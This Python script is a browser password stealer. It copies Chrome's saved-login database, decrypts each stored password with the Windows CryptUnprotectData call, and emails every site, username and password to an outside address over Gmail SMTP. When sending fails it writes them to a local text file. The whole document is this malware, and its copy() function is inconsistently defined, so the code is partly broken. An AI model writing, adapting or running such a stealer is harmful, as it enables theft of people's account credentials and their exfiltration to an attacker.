import os
import sqlite3
import win32crypt
import requests
import smtplib
from email.message import EmailMessage
from shutil import copyfile


def copy():
    conn = sqlite3.connect(copy_file)
    cursor = conn.cursor()

    cursor.execute('SELECT action_url, username_value, password_value FROM logins')

    file = open('a.txt', 'w+')
    
    for result in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        try:
            if password:
                file.write('Site : ' + result[0] + '\n')
                file.write('Username : ' + result[1] + '\n')
                file.write('Password : ' + str(password) + '\n')
        except:
            continue

    file.close()


def email(copy_file):
    
    sender = 'Sender Email ID'
    reciever = 'Reciever Email ID'
    password1 = 'password'
    subject = 'Passwords'
    mail = EmailMessage()
    message = ''
    
    conn = sqlite3.connect(copy_file)
    cursor = conn.cursor()

    cursor.execute('SELECT action_url, username_value, password_value FROM logins')
    for result in cursor.fetchall():
        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]
        try:
            if password:
                message += 'Site : ' + result[0] + '\n'
                message += 'Username : ' + result[1] + '\n'
                message += 'Password : ' + password.decode('utf-8') + '\n'
        except:
            continue

    conn.close()
    
    mail.set_content(message)
    mail['Subject'] = subject
    mail['From'] = sender
    mail['to'] = reciever
    
    
    try:
        smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
        smtpObj.starttls()
        smtpObj.login(sender, password1)
        smtpObj.send_message(mail)
        smtpObj.quit()    
    except:
        copy(copy_file)


def main():

	data_file = os.path.expanduser(r'~\AppData\Local\Google\Chrome\User Data\Default\Login Data')
	copy_file = os.getcwd() + '\cleaned'
	copyfile(data_file, copy_file)

	try:
	    r = requests.get('http://www.google.com')
	    email(copy_file)

	except:
	    copy(copy_file)
	    

if __name__ == '__main__':
	main()
